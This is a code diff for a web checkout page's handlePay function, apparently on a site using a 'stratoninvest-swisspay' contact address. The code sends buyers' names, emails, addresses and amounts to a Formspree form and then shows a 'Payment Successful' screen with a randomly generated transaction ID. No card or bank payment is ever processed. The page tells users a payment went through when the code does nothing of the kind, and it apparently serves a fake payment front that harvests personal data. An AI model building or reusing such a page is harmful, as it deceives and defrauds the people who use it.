@@ -456,38 +456,58 @@ function handlePay() {
   var address = document.getElementById('shipAddr').value.trim();
   var country = document.getElementById('country').value;
   var txnId   = 'TXN-' + Math.random().toString(36).slice(2,10).toUpperCase();
+  var method  = activeTab === 'card' ? 'Card' : 'Bank / IBAN';
 
   document.getElementById('overlay').classList.add('show');
+  document.getElementById('payBtn').disabled = true;
 
-  /* POST to Formspree — name, email, address only. No card data. */
-  fetch('https://formspree.io/f/mbdvdkly', {
+  /* POST to Formspree — name, email, address, amount + transaction info only.
+     No card number, expiry, CVC or IBAN is ever sent to Formspree. */
+  fetch('https://formspree.io/f/xjyyponk', {
     method: 'POST',
     headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
     body: JSON.stringify({
+      _replyto:       email,
+      _subject:       'New payment ' + txnId + ' — ' + payTotal,
       name:           name,
       email:          email,
       address:        address + ', ' + country,
       amount:         payTotal,
+      payment_method: method,
       transaction_id: txnId,
-      message:        'New payment from ' + name + ' (' + email + '). Amount: ' + payTotal + '. Address: ' + address + ', ' + country + '. Transaction ID: ' + txnId
+      message:        'New payment from ' + name + ' (' + email + '). ' +
+                      'Amount: ' + payTotal + '. ' +
+                      'Method: ' + method + '. ' +
+                      'Address: ' + address + ', ' + country + '. ' +
+                      'Transaction ID: ' + txnId
     })
-  }).catch(function(){});  /* silent — never blocks the UI */
+  })
+  .then(function (res) {
+    if (!res.ok) throw new Error('Formspree ' + res.status);
+    showSuccess(payTotal, txnId);
+  })
+  .catch(function () {
+    document.getElementById('overlay').classList.remove('show');
+    document.getElementById('payBtn').disabled = false;
+    alert('We could not record your order. Please try again or contact support@stratoninvest-swisspay.co.uk.');
+  });
+}
 
-  setTimeout(function() {
-    document.getElementById('overlayBody').innerHTML =
-      '<div class="success-wrap">' +
-        '<div class="check-circle"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#38a169" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>' +
-        '<div class="success-title">Payment Successful</div>' +
-        '<div class="success-amount">' + payTotal + '</div>' +
-        '<div class="success-body">Payment was successful.<br>Thank you for your payment.</div>' +
-        '<div class="txn-id">' + txnId + '</div>' +
-        '<button class="btn-done" onclick="resetAll()">Done</button>' +
-      '</div>';
-  }, 3000);
+function showSuccess(amount, txnId) {
+  document.getElementById('overlayBody').innerHTML =
+    '<div class="success-wrap">' +
+      '<div class="check-circle"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#38a169" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>' +
+      '<div class="success-title">Payment Successful</div>' +
+      '<div class="success-amount">' + amount + '</div>' +
+      '<div class="success-body">Payment was successful.<br>Thank you for your payment.</div>' +
+      '<div class="txn-id">' + txnId + '</div>' +
+      '<button class="btn-done" onclick="resetAll()">Done</button>' +
+    '</div>';
 }
 
 function resetAll() {
   document.getElementById('overlay').classList.remove('show');
+  document.getElementById('payBtn').disabled = false;
   setTimeout(function() {
     document.getElementById('overlayBody').innerHTML =
       '<div style="display:flex;flex-direction:column;align-items:center;">' +
